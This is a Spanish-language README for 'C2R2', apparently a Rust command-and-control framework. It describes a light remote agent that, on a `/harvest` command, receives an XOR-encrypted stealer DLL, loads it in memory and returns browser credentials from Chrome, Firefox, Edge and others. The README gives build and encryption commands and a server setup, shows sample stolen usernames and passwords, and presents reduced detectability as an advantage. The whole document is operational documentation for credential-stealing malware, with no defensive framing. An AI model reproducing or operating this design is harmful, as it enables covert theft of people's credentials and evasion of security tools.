# C2R2 - Arquitectura Modular con Stealer DLL

## 🎯 Concepto

El agent de C2R2 es **ligero y modular**. Solo incluye funcionalidad básica del C2 (~500 KB) y ejecuta el stealer bajo demanda cuando se necesita.

## 📦 Componentes

### 1. Agent Base (Ligero)
```
agent.exe (~500 KB)
```

**Funcionalidades Incluidas**:
- ✅ Conexión directa al C2 (sin shellcode)
- ✅ Comandos shell (`whoami`, `dir`, etc.)
- ✅ Upload/Download de archivos
- ✅ Recolección de sysinfo (hostname, user, OS, privilegios)
- ✅ Ejecución de módulos DLL bajo demanda

**NO Incluye**:
- ❌ Stealer de credenciales
- ❌ Otros módulos pesados

### 2. Módulo Stealer (Bajo Demanda)

El stealer es una DLL compilada separadamente que el agent recibe cuando se ejecuta `/harvest`:

| Módulo | Descripción | Tamaño |
|--------|-------------|--------|
| `stealer.dll` | Roba credenciales de browsers (Chrome, Firefox, Edge, etc.) | ~2 MB |

### 3. Servidor C2

El servidor C2 maneja:

**A) Servidor TCP (puerto 4444)**:
- Conexiones de agents
- Envío de comandos
- Recepción de resultados
- **Transfer de archivos** (Upload/Download)

**B) Comando `/harvest`**:
- Sube `stealer.enc` al agent (vía `/upload`)
- Sube `stealer.key` al agent (vía `/upload`)
- Envía comando `__HARVEST__`
- Recibe credenciales robadas

## 🚀 Flujo de Ejecución

### `/harvest` - Robar Credenciales

```
┌─────────────┐                 ┌─────────────┐                ┌──────────────┐
│   Operador  │                 │  C2 Server  │                │ Agent (PC)   │
└──────┬──────┘                 └──────┬──────┘                └──────┬───────┘
       │                               │                               │
       │ 1. /harvest                   │                               │
       ├──────────────────────────────►│                               │
       │                               │                               │
       │                               │ 2. __UPLOAD__|stealer.enc     │
       │                               ├──────────────────────────────►│
       │                               │                               │
       │                               │                               │ 3. Guardar stealer.enc
       │                               │                               │
       │                               │ 4. __UPLOAD__|stealer.key     │
       │                               ├──────────────────────────────►│
       │                               │                               │
       │                               │                               │ 5. Guardar stealer.key
       │                               │                               │
       │                               │ 6. __HARVEST__                │
       │                               ├──────────────────────────────►│
       │                               │                               │
       │                               │                               │ 7. Leer stealer.enc
       │                               │                               │ 8. Leer stealer.key
       │                               │                               │ 9. XOR Decrypt
       │                               │                               │ 10. Escribir temp DLL
       │                               │                               │ 11. LoadLibrary
       │                               │                               │ 12. GetProcAddress
       │                               │                               │ 13. steal_credentials()
       │                               │                               │ 14. FreeLibrary
       │                               │                               │ 15. Borrar temp DLL
       │                               │                               │ 16. Borrar stealer.enc/.key
       │                               │                               │
       │                               │   17. __CREDENTIALS_B64__     │
       │                               │◄──────────────────────────────┤
       │                               │                               │
       │  18. Mostrar credenciales     │                               │
       │◄──────────────────────────────┤                               │
```

## 🔧 Setup del Servidor

### 1. Estructura de Directorios

```
c2r2-server/
├── logs/                  ← Logs del servidor
├── downloads/             ← Archivos descargados del agent
├── harvested/             ← Credenciales robadas
└── modules/               ← Módulos DLL encriptados
    ├── stealer.enc        ← DLL encriptada (XOR)
    └── stealer.key        ← Clave XOR (32 bytes)
```

### 2. Generar Módulo Stealer

```bash
# 1. Compilar DLL
cargo build --release --package stealer-dll

# 2. Encriptar DLL (genera .enc y .key)
cd builder
cargo run -- encrypt-module
```

Esto genera:
- `c2r2-server/modules/stealer.enc` (DLL encriptada con XOR)
- `c2r2-server/modules/stealer.key` (Clave XOR de 32 bytes)

### 3. Generar Agent

```bash
cd builder
cargo run -- build-agent --name my_agent --server 10.0.0.5:4444
```

Esto genera:
- `my_agent.exe` (~500 KB, **sin** stealer embebido)

### 4. Ejecutar Servidor

```bash
cd c2r2-server
cargo run --release -- --bind 0.0.0.0 --port 4444
```

Salida:
```
╔═══════════════════════════════════════════════════════════╗
║          C2R2 - Command & Control Server v2.0            ║
║              Direct Connection - No Shellcode            ║
╚═══════════════════════════════════════════════════════════╝

🌐 Listening: 0.0.0.0:4444
📝 Help: /help
📂 Logs: logs/
```

## 🎮 Uso desde el C2

### 1. Conectarse al Agent

```bash
C2R2> /list
📋 1 cliente(s) conectado(s)
┌────┬───────────────┬──────────────┬──────────┬─────────────┬────────────┬─────────────────────┐
│ ID │ Dirección     │ Hostname     │ Usuario  │ OS          │ Privilegios│ Conectado           │
├────┼───────────────┼──────────────┼──────────┼─────────────┼────────────┼─────────────────────┤
│ 1  │ 192.168.1.100 │ DESKTOP-PC   │ john     │ Windows 11  │ User       │ 2025-10-15 14:30:00 │
└────┴───────────────┴──────────────┴──────────┴─────────────┴────────────┴─────────────────────┘

C2R2> /select 1
✅ Cliente [1]
```

### 2. Ejecutar `/harvest`

```bash
C2R2[1]> /harvest

╔═══════════════════════════════════════════════════════════╗
║           🔑 HARVESTING CREDENTIALS [1]                   ║
╚═══════════════════════════════════════════════════════════╝

  � Subiendo stealer.enc...
  � Subiendo stealer.key...
  � Ejecutando stealer...
  🎯 Chrome, Edge, Firefox, Brave, Opera
  ⏳ Esperando credenciales...

╔═══════════════════════════════════════════════════════════╗
║         🔑 CREDENCIALES OBTENIDAS [1]                     ║
╚═══════════════════════════════════════════════════════════╝

  📊 Total: 42 credenciales
  💾 Guardado: harvested/credentials_1_20251015_143200.txt
  📄 Tamaño: 15234 bytes

─────────────────────────────────────────────────────────────
Browser: Chrome - Profile: Default
URL: https://facebook.com
Username: john@email.com
Password: MySecretPass123
─────────────────────────────────────────────────────────────
...
```

## 🔒 Seguridad

- ✅ **DLL Encriptada**: XOR con clave aleatoria de 32 bytes
- ✅ **Transfer Bajo Demanda**: Solo cuando se ejecuta `/harvest`
- ✅ **Efímero**: DLL se elimina después de ejecutar
- ✅ **Agent Ligero**: Menos superficie de ataque (~500 KB)
- ✅ **Sin HTTP**: Usa solo TCP para todo (más simple)
- ✅ **No Firma**: DLL custom sin firmar

## 📊 Ventajas

| Antes (Monolítico) | Después (Modular) |
|--------------------|-------------------|
| agent.exe = 2.5 MB | agent.exe = 500 KB |
| Todo embebido | Solo lo básico |
| Más detectable | Menos detectable |
| Difícil actualizar | Fácil actualizar módulo |
| Sin flexibilidad | Muy flexible |

## 🐛 Troubleshooting

### "modules/stealer.enc no encontrado"
```bash
# Generar el módulo
cd builder
cargo run -- encrypt-module
```

### "Error cargando DLL (LoadLibrary failed)"
- ✅ Verifica que el agent esté en Windows
- ✅ Verifica que los archivos se subieron correctamente
- ✅ Revisa permisos en directorio temporal

### "stealer.enc no encontrado" (en agent)
- ✅ El servidor debe tenerlo en `modules/stealer.enc`
- ✅ Ejecuta `encrypt-module` primero
- ✅ Verifica que el transfer completó

## 📝 Notas

- El módulo stealer **NO** está en Git (solo en `c2r2-server/modules/`)
- El builder genera los archivos `.enc` y `.key`
- El agent recibe el módulo vía `/upload` estándar
- **No necesita servidor HTTP** - todo por TCP

